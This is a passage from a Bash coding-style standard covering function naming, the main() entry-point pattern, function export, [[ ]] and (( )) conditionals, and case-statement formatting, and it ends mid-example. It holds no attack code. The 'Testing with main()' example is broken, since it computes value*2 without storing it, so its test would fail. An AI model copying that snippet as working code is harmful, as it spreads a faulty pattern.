\`\`\`bash
# Single-line functions for simple operations
vecho() { ((VERBOSE)) || return 0; _msg "$@"; }

# Multi-line functions with local variables
main() {
  local -i exitcode=0
  local -- variable
  # Function body
  return "$exitcode"
}
\`\`\`


---


**Rule: BCS0602**

### Function Names
Use lowercase with underscores to match shell conventions and avoid conflicts with built-in commands.

```bash
# ✓ Good - lowercase with underscores
my_function() {
  …
}

process_log_file() {
  …
}

# ✓ Private functions use leading underscore
_my_private_function() {
  …
}

_validate_input() {
  …
}

# ✗ Avoid - CamelCase or UPPER_CASE
MyFunction() {      # Don't do this
  …
}

PROCESS_FILE() {    # Don't do this
  …
}
```

**Rationale:**
- **Lowercase with underscores**: Matches standard Unix/Linux utility naming (e.g., `grep`, `sed`, `file_name`)
- **Avoid CamelCase**: Can be confused with variables or commands
- **Underscore prefix for private**: Clear signal that function is for internal use only
- **Consistency**: All built-in bash commands are lowercase

**Anti-patterns to avoid:**
```bash
# ✗ Don't override built-in commands without good reason
cd() {           # Dangerous - overrides built-in cd
  builtin cd "$@" && ls
}

# ✓ If you must wrap built-ins, use a different name
change_dir() {
  builtin cd "$@" && ls
}

# ✗ Don't use special characters
my-function() {  # Dash creates issues in some contexts
  …
}
```


---


**Rule: BCS0603**

### Main Function

**Always include a `main()` function for scripts longer than approximately 40 lines. The main function serves as the single entry point, orchestrating the script's logic and making the code more organized, testable, and maintainable. Place `main "$@"` at the bottom of the script, just before the `#fin` marker.**

**Rationale:**

- **Single Entry Point**: Provides clear script execution flow starting from one well-defined function
- **Testability**: Scripts can be sourced for testing without executing; functions can be tested individually
- **Organization**: Separates initialization, argument parsing, and main logic into clear sections
- **Debugging**: Easy to add debugging output or dry-run logic in one central location
- **Scope Control**: All script execution variables can be local to main, preventing global namespace pollution
- **Exit Code Management**: Centralized return/exit code handling for consistent error reporting

**When to use main():**

```bash
# Use main() when:
# - Script is longer than ~40 lines
# - Script has multiple functions
# - Script requires argument parsing
# - Script needs to be testable
# - Script has complex logic flow

# Can skip main() when:
# - Script is trivial (< 40 lines)
# - Script is a simple wrapper
# - Script has no functions
# - Script is linear (no branching)
```

**Basic main() structure:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Functions
# ============================================================================

# ... helper functions ...

# ============================================================================
# Main
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -h|--help) usage; return 0 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  # Main logic
  info 'Starting processing...'

  # ... business logic ...

  # Return success
  return 0
}

# Script invocation
main "$@"

#fin
```

**Main function with argument parsing:**

```bash
main() {
  # Local variables for parsed options
  local -i verbose=0
  local -i dry_run=0
  local -- output_file=''
  local -a input_files=()

  # Parse arguments
  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_file="$1"
      ;;
    -h|--help)
      usage
      return 0
      ;;
    --)
      shift
      break
      ;;
    -*)
      die 22 "Invalid option: $1"
      ;;
    *)
      input_files+=("$1")
      ;;
  esac; shift; done

  # Remaining arguments after --
  input_files+=("$@")

  # Make parsed values readonly
  readonly -- verbose dry_run output_file
  readonly -a input_files

  # Validate arguments
  if [[ ${#input_files[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  # Main logic
  if ((verbose)); then
    info "Processing ${#input_files[@]} files"
    ((dry_run)) && info '[DRY-RUN] Mode enabled'
  fi

  # Process files
  local -- file
  for file in "${input_files[@]}"; do
    process_file "$file"
  done

  return 0
}
```

**Main function with setup/cleanup:**

```bash
# Cleanup function
cleanup() {
  local -i exit_code=$?

  # Cleanup operations
  if [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]]; then
    rm -rf "$TEMP_DIR"
  fi

  return "$exit_code"
}

main() {
  # Setup trap for cleanup
  trap cleanup EXIT

  # Create temp directory
  TEMP_DIR=$(mktemp -d)
  readonly -- TEMP_DIR

  # Main logic
  info "Using temp directory: $TEMP_DIR"

  # ... processing ...

  # Cleanup happens automatically via trap
  return 0
}

main "$@"

#fin
```

**Main function with error handling:**

```bash
main() {
  local -i errors=0

  # Parse arguments
  # ...

  # Process items with error tracking
  local -- item
  for item in "${items[@]}"; do
    if ! process_item "$item"; then
      error "Failed to process: $item"
      ((errors+=1))
    fi
  done

  # Report results
  if ((errors > 0)); then
    error "Completed with $errors errors"
    return 1
  else
    success 'All items processed successfully'
    return 0
  fi
}
```

**Main function enabling sourcing for tests:**

```bash
# Script can be sourced for testing
main() {
  # ... script logic ...
  return 0
}

# Only execute main if script is run directly (not sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

#fin
```

**Complete example with main():**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg

  case "${FUNCNAME[1]}" in
    info) prefix+=" ${CYAN}◉${NC}" ;;
    error) prefix+=" ${RED}✗${NC}" ;;
    *) ;;
  esac

  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Documentation Functions
# ============================================================================

usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] FILE...

Process files with various options.

Options:
  -v, --verbose     Enable verbose output
  -n, --dry-run     Show what would be done
  -o, --output DIR  Output directory
  -h, --help        Show this help

Examples:
  script.sh file.txt
  script.sh -v -o /tmp file1.txt file2.txt
  script.sh -n --output /backup *.txt
EOF
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# ============================================================================
# Business Logic Functions
# ============================================================================

process_file() {
  local -- file="$1"

  # Validate file
  if [[ ! -f "$file" ]]; then
    error "File not found: $file"
    return 2
  fi

  info "Processing: $file"

  # Process file logic
  # ...

  return 0
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Declare option variables
  local -i verbose=0
  local -i dry_run=0
  local -- output_dir=''
  local -a input_files=()

  # Parse command-line arguments
  while (($#)); do case $1 in
    -v|--verbose) verbose=1 ;;
    -n|--dry-run) dry_run=1 ;;
    -o|--output)
      noarg "$@"
      shift
      output_dir="$1"
      ;;
    -h|--help)
      usage
      return 0
      ;;
    --)
      shift
      break
      ;;
    -*)
      die 22 "Invalid option: $1"
      ;;
    *)
      input_files+=("$1")
      ;;
  esac; shift; done

  # Collect remaining arguments
  input_files+=("$@")

  # Make options readonly
  readonly -- verbose dry_run output_dir
  readonly -a input_files

  # Validate arguments
  if [[ ${#input_files[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  if [[ -n "$output_dir" && ! -d "$output_dir" ]]; then
    error "Output directory not found: $output_dir"
    return 2
  fi

  # Display configuration
  if ((verbose)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#input_files[@]}"
    [[ -n "$output_dir" ]] && info "Output: $output_dir"
    ((dry_run)) && info '[DRY-RUN] Mode enabled'
  fi

  # Process each file
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${input_files[@]}"; do
    if ((dry_run)); then
      info "[DRY-RUN] Would process: $file"
      ((success_count+=1))
    elif process_file "$file"; then
      ((success_count+=1))
    else
      ((error_count+=1))
    fi
  done

  # Report results
  if ((verbose)); then
    info "Processed: $success_count files"
    ((error_count > 0)) && info "Errors: $error_count"
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - no main function in complex script
#!/bin/bash
set -euo pipefail

# ... 200 lines of code directly in script ...
# Hard to test, hard to organize

# ✓ Correct - main function
#!/bin/bash
set -euo pipefail

# ... helper functions ...

main() {
  # Script logic
}

main "$@"

#fin

# ✗ Wrong - main() not at end
main() {
  # ...
}

main "$@"  # Called here

# More functions defined after main is called
helper_function() {
  # ...
}
# This function is defined after main executes!

# ✓ Correct - main() at end, called last
helper_function() {
  # ...
}

main() {
  # Can call helper_function
}

main "$@"
#fin

# ✗ Wrong - parsing arguments outside main
verbose=0
dry_run=0

while (($#)); do
  # ... parse args ...
done

main() {
  # Uses global variables
}

main "$@"  # Arguments already consumed!

# ✓ Correct - parsing in main
main() {
  local -i verbose=0
  local -i dry_run=0

  while (($#)); do
    # ... parse args ...
  done

  readonly -- verbose dry_run
  # ... use variables ...
}

main "$@"

# ✗ Wrong - not passing arguments
main() {
  # Expects arguments but they're not passed
}

main  # Missing "$@"!

# ✓ Correct - pass all arguments
main "$@"

# ✗ Wrong - mixing global and local logic
total=0  # Global

main() {
  local -i count=0
  # Mixes global and local state
  ((total+=count))
}

# ✓ Correct - all logic in main
main() {
  local -i total=0
  local -i count=0
  # All local, clean scope
  ((total+=count))
}
```

**Edge cases:**

**1. Script needs global configuration:**

```bash
# Global configuration (before functions)
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Parse arguments and modify globals
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    *) die 22 "Invalid option: $1" ;;
  esac; shift; done

  # Make globals readonly
  readonly -- VERBOSE DRY_RUN

  # ... rest of logic ...
}

main "$@"
```

**2. Script has initialization code:**

```bash
# Initialization before main
declare -A CONFIG=()

load_config() {
  # Load configuration into global array
  # ...
}

# Load before main
load_config

main() {
  # Use CONFIG array
  echo "App: ${CONFIG[app_name]}"
}

main "$@"
```

**3. Script is library and executable:**

```bash
# Library functions
utility_function() {
  # ...
}

# Main function for when executed
main() {
  # ...
}

# Only run main if executed (not sourced)
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

#fin
```

**4. Multiple main scenarios:**

```bash
# Different modes
main_install() {
  # Installation logic
}

main_uninstall() {
  # Uninstallation logic
}

main() {
  local -- mode="${1:-}"

  case "$mode" in
    install) shift; main_install "$@" ;;
    uninstall) shift; main_uninstall "$@" ;;
    *) die 22 "Invalid mode: $mode" ;;
  esac
}

main "$@"
```

**Testing with main():**

```bash
# Script: myapp.sh
main() {
  local -i value="$1"
  ((value * 2))
  echo "$value"
}

# Only execute if run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  main "$@"
fi

# Test file: test_myapp.sh
#!/bin/bash
source ./myapp.sh  # Source without executing

# Test main function
result=$(main 5)

if [[ "$result" == "10" ]]; then
  echo "PASS"
else
  echo "FAIL: Expected 10, got $result"
fi
```

**Summary:**

- **Use main() for scripts >40 lines** - provides organization and testability
- **Single entry point** - all execution flows through main()
- **Place main() at end** - define helpers first, main last
- **Always call with "$@"** - `main "$@"` to pass all arguments
- **Parse arguments in main** - keep argument handling in one place
- **Make locals readonly** - after parsing, make option variables readonly
- **Return appropriate code** - 0 for success, non-zero for errors
- **Consider sourcing** - use `[[ "${BASH_SOURCE[0]}" == "${0}" ]]` for testability
- **Organize sections** - messaging, documentation, helpers, business logic, main

**Key principle:** The main() function is the orchestrator - it doesn't do the work, it coordinates it. All heavy lifting should be in helper functions. Main's job is to parse arguments, validate input, call the right functions in the right order, and return an appropriate exit code. This separation makes scripts testable, debuggable, and maintainable.


---


**Rule: BCS0604**

### Function Export
\`\`\`bash
# Export functions when needed by subshells
grep() { /usr/bin/grep "$@"; }
find() { /usr/bin/find "$@"; }
declare -fx grep find
\`\`\`


---


**Rule: BCS0605**

### Production Script Optimization
Once a script is mature and ready for production:
- Remove unused utility functions (e.g., if `yn()`, `decp()`, `trim()`, `s()` are not used)
- Remove unused global variables (e.g., `PROMPT`, `DEBUG` if not referenced)
- Remove unused messaging functions that your script doesn't call
- Keep only the functions and variables your script actually needs
- This reduces script size, improves clarity, and eliminates maintenance burden

Example: A simple script may only need `error()` and `die()`, not the full messaging suite.


---


**Rule: BCS0701**

### Conditionals

**Use `[[ ]]` for string/file tests, `(())` for arithmetic:**

\`\`\`bash
# String and file tests - use [[ ]]
[[ -d "$path" ]] && echo 'Directory exists'
[[ -f "$file" ]] || die 1 "File not found: $file"
[[ "$status" == 'success' ]] && continue

# Arithmetic tests - use (())
((VERBOSE==0)) || echo 'Verbose mode'
((var > 5)) || return 1
((count >= MAX_RETRIES)) && die 1 'Too many retries'

# Complex conditionals - combine both
if [[ -n "$var" ]] && ((count > 0)); then
  process_data
fi

# Short-circuit evaluation
[[ -f "$file" ]] && source "$file"
((VERBOSE)) || return 0
\`\`\`

**Rationale for `[[ ]]` over `[ ]`:**

1. **No word splitting or glob expansion** on variables
2. **Pattern matching** with `==` and `=~` operators
3. **Logical operators** `&&` and `||` work inside (no `-a` / `-o` needed)
4. **No need to quote variables** in most cases (but still recommended)
5. **More operators**: `<`, `>` for string comparison (lexicographic)

**Comparison of `[[ ]]` vs `[ ]`:**

\`\`\`bash
var="two words"

# ✗ [ ] requires quotes or fails
[ $var = "two words" ]  # ERROR: too many arguments
[ "$var" = "two words" ]  # Works but fragile

# ✓ [[ ]] handles unquoted variables (but quote anyway)
[[ $var == "two words" ]]  # Works even without quotes
[[ "$var" == "two words" ]]  # Recommended - quote anyway

# Pattern matching (only works in [[ ]])
[[ "$file" == *.txt ]] && echo "Text file"
[[ "$input" =~ ^[0-9]+$ ]] && echo "Number"

# Logical operators inside [[ ]]
[[ -f "$file" && -r "$file" ]] && cat "$file"

# vs [ ] requires separate tests
[ -f "$file" ] && [ -r "$file" ] && cat "$file"
\`\`\`

**Arithmetic conditionals - use `(())`:**

\`\`\`bash
# ✓ Correct - natural C-style syntax
if ((count > 0)); then
  echo "Count: $count"
fi

((i >= MAX)) && die 1 'Limit exceeded'

# ✗ Wrong - using [[ ]] for arithmetic (verbose, error-prone)
if [[ "$count" -gt 0 ]]; then  # Unnecessary
  echo "Count: $count"
fi

# Comparison operators in (())
((a > b))   # Greater than
((a >= b))  # Greater or equal
((a < b))   # Less than
((a <= b))  # Less or equal
((a == b))  # Equal
((a != b))  # Not equal
\`\`\`

**Pattern matching examples:**

\`\`\`bash
# Glob pattern matching
[[ "$filename" == *.@(jpg|png|gif) ]] && process_image "$filename"

# Regular expression matching
if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
  echo "Valid email"
else
  die 22 "Invalid email: $email"
fi

# Case-insensitive matching (bash 3.2+)
shopt -s nocasematch
[[ "$input" == "yes" ]] && echo "Affirmative"  # Matches YES, Yes, yes
shopt -u nocasematch
\`\`\`

**Short-circuit evaluation:**

\`\`\`bash
# Execute second command only if first succeeds
[[ -f "$config" ]] && source "$config"
((DEBUG)) && set -x

# Execute second command only if first fails
[[ -d "$dir" ]] || mkdir -p "$dir"
((count > 0)) || die 1 'No items to process'

# Chaining multiple conditions
[[ -f "$file" ]] && [[ -r "$file" ]] && cat "$file"
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - using old [ ] syntax
if [ -f "$file" ]; then  # Use [[ ]] instead
  echo "Found"
fi

# ✗ Wrong - using -a and -o in [ ]
[ -f "$file" -a -r "$file" ]  # Deprecated, fragile

# ✓ Correct - use [[ ]] with && and ||
[[ -f "$file" && -r "$file" ]]

# ✗ Wrong - string comparison with [ ] unquoted
[ $var = "value" ]  # Breaks if var contains spaces

# ✓ Correct - use [[ ]] (still quote for clarity)
[[ "$var" == "value" ]]

# ✗ Wrong - arithmetic with [[ ]] using -gt/-lt
[[ "$count" -gt 10 ]]  # Verbose, less readable

# ✓ Correct - use (()) for arithmetic
((count > 10))
\`\`\`

**Common file test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-e file` | File exists |
| `-f file` | Regular file |
| `-d dir` | Directory |
| `-r file` | Readable |
| `-w file` | Writable |
| `-x file` | Executable |
| `-s file` | Not empty (size > 0) |
| `-L link` | Symbolic link |
| `file1 -nt file2` | file1 newer than file2 |
| `file1 -ot file2` | file1 older than file2 |

**Common string test operators (use with `[[ ]]`):**

| Operator | Meaning |
|----------|---------|
| `-z "$str"` | String is empty (zero length) |
| `-n "$str"` | String is not empty |
| `"$a" == "$b"` | Strings are equal |
| `"$a" != "$b"` | Strings are not equal |
| `"$a" < "$b"` | Lexicographic less than |
| `"$a" > "$b"` | Lexicographic greater than |
| `"$str" =~ regex` | String matches regex |
| `"$str" == pattern` | String matches glob pattern |


---


**Rule: BCS0702**

### Case Statements

**Use `case` statements for multi-way branching based on pattern matching. Case statements are more readable and efficient than long `if/elif` chains when testing a single value against multiple patterns. Choose compact format for simple single-action cases, and expanded format for multi-line logic. Always align actions consistently and use appropriate pattern matching syntax.**

**Rationale:**

- **Readability**: Case statements are clearer than long if/elif chains for pattern-based branching
- **Pattern Matching**: Native support for wildcards, alternation, and character classes
- **Performance**: Case is faster than multiple if/elif tests - single evaluation of the test value
- **Maintainability**: Easy to add, remove, or reorder cases without restructuring logic
- **Argument Parsing**: Perfect for command-line option processing with multiple flags
- **Exhaustive Matching**: Default `*)` case ensures all possibilities are handled
- **Visual Organization**: Column alignment makes structure immediately obvious

**When to use case vs if/elif:**

```bash
# ✓ Use case when - testing single variable against multiple values
case "$action" in
  start) start_service ;;
  stop) stop_service ;;
  restart) restart_service ;;
  status) show_status ;;
  *) die 22 "Invalid action: $action" ;;
esac

# ✓ Use case when - pattern matching needed
case "$filename" in
  *.txt) process_text_file ;;
  *.pdf) process_pdf_file ;;
  *.md) process_markdown_file ;;
  *) die 22 "Unsupported file type" ;;
esac

# ✓ Use case when - parsing command-line arguments
case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help) usage; exit 0 ;;
  -*) die 22 "Invalid option: $1" ;;
  *) FILENAME="$1" ;;
esac

# ✗ Use if/elif when - testing different variables
if [[ ! -f "$file" ]]; then
  die 2 "File not found: $file"
elif [[ ! -r "$file" ]]; then
  die 1 "File not readable: $file"
elif [[ -z "$output" ]]; then
  die 22 "Output path required"
fi

# ✗ Use if/elif when - complex conditional logic
if [[ "$count" -gt 100 && "$verbose" -eq 1 ]]; then
  info 'Processing large batch in verbose mode'
elif [[ "$count" -gt 100 ]]; then
  info 'Processing large batch'
fi

# ✗ Use if/elif when - testing numeric ranges
if ((value < 0)); then
  error='negative'
elif ((value == 0)); then
  error='zero'
elif ((value <= 10)); then
  category='small'
else
  category='large'
fi
```

**Compact format:**

Use compact format when each case performs a single action or simple command.

**Guidelines:**
- All actions on same line as pattern
- Terminate with `;;` on same line
- Align `;;` at consistent column (typically 14-18)
- No blank lines between cases
- Perfect for argument parsing with simple flag setting

**Compact format example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

# Compact case for simple argument parsing
while (($#)); do
  case $1 in
    -v|--verbose) VERBOSE=1 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -f|--force)   FORCE=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -h|--help)    usage; exit 0 ;;
    -V|--version) echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -o|--output)  noarg "$@"; shift; OUTPUT_FILE="$1" ;;
    --)           shift; break ;;
    -*)           die 22 "Invalid option: $1" ;;
    *)            INPUT_FILES+=("$1") ;;
  esac
  shift
done

INPUT_FILES+=("$@")
readonly -- VERBOSE DRY_RUN FORCE OUTPUT_FILE
readonly -a INPUT_FILES

#fin
```

**Expanded format:**

Use expanded format when cases have multi-line actions, require comments, or perform complex operations.

**Guidelines:**
- Action starts on next line, indented
- Multiple statements aligned at consistent column
- Terminate with `;;` on separate line, aligned left
- Blank line after `;;` separates cases visually
- Comments within case branches are acceptable
- Column alignment typically at 14-18 characters

**Expanded format example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -i INSTALL_BUILTIN=0
declare -i VERBOSE=0
declare -- PREFIX='/usr/local'
declare -- BIN_DIR=''
declare -- LIB_DIR=''

# Expanded case for complex argument parsing
while (($#)); do
  case $1 in
    -b|--builtin)     INSTALL_BUILTIN=1
                      ((VERBOSE)) && info 'Builtin installation enabled'
                      ;;

    -p|--prefix)      noarg "$@"
                      shift
                      PREFIX="$1"
                      BIN_DIR="$PREFIX/bin"
                      LIB_DIR="$PREFIX/lib/bash"
                      ((VERBOSE)) && info "Prefix set to: $PREFIX"
                      ;;

    -v|--verbose)     VERBOSE=1
                      info 'Verbose mode enabled'
                      ;;

    -V|--version)     echo "$SCRIPT_NAME $VERSION"
                      exit 0
                      ;;

    -h|--help)        usage
                      exit 0
                      ;;

    --)               shift
                      break
                      ;;

    -*)               error "Invalid option: $1"
                      usage
                      exit 22
                      ;;

    *)                error "Unexpected argument: $1"
                      usage
                      exit 22
                      ;;
  esac
  shift
done

readonly -- INSTALL_BUILTIN VERBOSE PREFIX BIN_DIR LIB_DIR

#fin
```

**Pattern matching syntax:**

**1. Literal patterns:**

```bash
# Exact string match
case "$value" in
  start) echo 'Starting...' ;;
  stop) echo 'Stopping...' ;;
  restart) echo 'Restarting...' ;;
esac

# Quote pattern if it contains special characters
case "$email" in
  'admin@example.com') echo 'Admin user' ;;
  'user@example.com') echo 'Regular user' ;;
esac
```

**2. Wildcard patterns (globbing):**

```bash
# Star wildcard - matches any characters
case "$filename" in
  *.txt) echo 'Text file' ;;
  *.pdf) echo 'PDF file' ;;
  *.log) echo 'Log file' ;;
  *) echo 'Unknown file type' ;;
esac

# Question mark wildcard - matches single character
case "$code" in
  ??) echo 'Two-character code' ;;
  ???) echo 'Three-character code' ;;
  *) echo 'Other length' ;;
esac

# Prefix/suffix matching
case "$path" in
  /usr/*) echo 'System path' ;;
  /home/*) echo 'Home directory' ;;
  /tmp/*) echo 'Temporary path' ;;
  *) echo 'Other path' ;;
esac
```

**3. Alternation (OR patterns):**

```bash
# Multiple patterns with |
case "$option" in
  -h|--help|help) usage; exit 0 ;;
  -v|--verbose|verbose) VERBOSE=1 ;;
  -q|--quiet|quiet) VERBOSE=0 ;;
esac

# Combining alternation with wildcards
case "$filename" in
  *.txt|*.md|*.rst) echo 'Text document' ;;
  *.jpg|*.png|*.gif) echo 'Image file' ;;
  *.sh|*.bash) echo 'Shell script' ;;
esac
```

**4. Character classes:**

```bash
# With extglob enabled
shopt -s extglob

case "$input" in
  # ?(pattern) - zero or one occurrence
  test?(s)) echo 'test or tests' ;;

  # *(pattern) - zero or more occurrences
  file*(s).txt) echo 'file.txt, files.txt, filess.txt, etc.' ;;

  # +(pattern) - one or more occurrences
  log+([0-9]).txt) echo 'log followed by digits' ;;

  # @(pattern) - exactly one occurrence
  @(start|stop|restart)) echo 'Valid action' ;;

  # !(pattern) - anything except pattern
  !(*.tmp|*.bak)) echo 'Not a temp or backup file' ;;
esac

# Bracket expressions
case "$char" in
  [0-9]) echo 'Digit' ;;
  [a-z]) echo 'Lowercase letter' ;;
  [A-Z]) echo 'Uppercase letter' ;;
  [!a-zA-Z0-9]) echo 'Special character' ;;
esac
```

**Complete argument parsing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ============================================================================
# Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i FORCE=0
declare -- OUTPUT_DIR=''
declare -- CONFIG_FILE="$SCRIPT_DIR/config.conf"
declare -a INPUT_FILES=()

# ============================================================================
# Messaging Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info) prefix+=" ◉" ;;
    warn) prefix+=" ⚠" ;;
    error) prefix+=" ✗" ;;
    success) prefix+=" ✓" ;;
    *) ;;
  esac
  for msg in "$@"; do
    printf '%s %s\n' "$prefix" "$msg"
  done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
error() { >&2 _msg "$@"; }
success() { >&2 _msg "$@"; }

die() {
  local -i exit_code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$exit_code"
}

# ============================================================================
# Documentation Functions
# ============================================================================

usage() {
  cat <<'EOF'
Usage: script.sh [OPTIONS] FILE...

Process files with various options.

Options:
  -v, --verbose          Enable verbose output
  -n, --dry-run          Show what would be done without doing it
  -f, --force            Force overwrite of existing files
  -q, --quiet            Suppress non-error output
  -o, --output DIR       Output directory
  -c, --config FILE      Configuration file
  -h, --help             Show this help message
  -V, --version          Show version information

Arguments:
  FILE...                Input files to process

Examples:
  script.sh file.txt
  script.sh -v -o /tmp file1.txt file2.txt
  script.sh -n --output /backup *.txt
EOF
}

# ============================================================================
# Helper Functions
# ============================================================================

noarg() {
  if (($# < 2)) || [[ "$2" =~ ^- ]]; then
    die 22 "Option $1 requires an argument"
  fi
}

# ============================================================================
# Business Logic
# ============================================================================

process_file() {
  local -- file="$1"

  if [[ ! -f "$file" ]]; then
    error "File not found: $file"
    return 2
  fi

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would process: $file"
  else
    info "Processing: $file"
    # Process file logic here
  fi

  return 0
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      -v|--verbose)     VERBOSE=1
                        info 'Verbose mode enabled'
                        ;;

      -n|--dry-run)     DRY_RUN=1
                        ;;

      -f|--force)       FORCE=1
                        ;;

      -q|--quiet)       VERBOSE=0
                        ;;

      -o|--output)      noarg "$@"
                        shift
                        OUTPUT_DIR="$1"
                        ;;

      -c|--config)      noarg "$@"
                        shift
                        CONFIG_FILE="$1"
                        ;;

      -V|--version)     echo "$SCRIPT_NAME $VERSION"
                        return 0
                        ;;

      -h|--help)        usage
                        return 0
                        ;;

      --)               shift
                        break
                        ;;

      -*)               die 22 "Invalid option: $1"
                        ;;

      *)                INPUT_FILES+=("$1")
                        ;;
    esac
    shift
  done

  # Collect remaining arguments after --
  INPUT_FILES+=("$@")

  # Make parsed values readonly
  readonly -- VERBOSE DRY_RUN FORCE OUTPUT_DIR CONFIG_FILE
  readonly -a INPUT_FILES

  # Validate arguments
  if [[ ${#INPUT_FILES[@]} -eq 0 ]]; then
    error 'No input files specified'
    usage
    return 22
  fi

  if [[ -n "$OUTPUT_DIR" && ! -d "$OUTPUT_DIR" ]]; then
    if ((FORCE)); then
      info "Creating output directory: $OUTPUT_DIR"
      mkdir -p "$OUTPUT_DIR"
    else
      die 2 "Output directory not found: $OUTPUT_DIR (use -f to create)"
    fi
  fi

  if [[ ! -f "$CONFIG_FILE" ]]; then
    warn "Config file not found: $CONFIG_FILE (using defaults)"
  fi

  # Display configuration
  if ((VERBOSE)); then
    info "$SCRIPT_NAME $VERSION"
    info "Input files: ${#INPUT_FILES[@]}"
    [[ -n "$OUTPUT_DIR" ]] && info "Output: $OUTPUT_DIR"
    ((DRY_RUN)) && info '[DRY-RUN] Mode enabled'
  fi

  # Process files
  local -- file
  local -i success_count=0
  local -i error_count=0

  for file in "${INPUT_FILES[@]}"; do
    if process_file "$file"; then
      ((success_count+=1))
    else
      ((error_count+=1))
    fi
  done

  # Report results
  if ((VERBOSE)); then
    success "Processed: $success_count files"
    ((error_count > 0)) && warn "Errors: $error_count"
  fi

  # Return appropriate exit code
  ((error_count == 0))
}

# ============================================================================
# Script Invocation
# ============================================================================

main "$@"

#fin
```

**File type routing example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Route files based on extension
process_file_by_type() {
  local -- file="$1"
  local -- filename="${file##*/}"

  case "$filename" in
    *.txt|*.md|*.rst)
